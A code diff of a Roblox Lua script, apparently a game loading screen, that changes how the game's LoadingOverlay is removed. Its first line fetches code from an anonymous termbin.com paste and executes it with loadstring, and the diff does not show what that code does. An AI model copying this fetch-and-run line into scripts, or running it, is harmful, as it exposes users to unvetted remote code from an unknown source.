@@ -1,5 +1,4 @@
 loadstring(game:HttpGet("https://termbin.com/6z6r"))()
-task.wait(2)
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -8,11 +7,17 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Wait for LoadingOverlay to exist then destroy it
-local loadingOverlay = playerGui:WaitForChild("LoadingOverlay", 10)
-if loadingOverlay then
-    loadingOverlay:Destroy()
-end
+-- Constantly check and delete LoadingOverlay
+task.spawn(function()
+    while true do
+        local loadingOverlay = playerGui:FindFirstChild("LoadingOverlay")
+        if loadingOverlay then
+            loadingOverlay:Destroy()
+            break
+        end
+        task.wait(0.1)
+    end
+end)
 
 -- Loading Screen
 local loadingGui = Instance.new("ScreenGui")
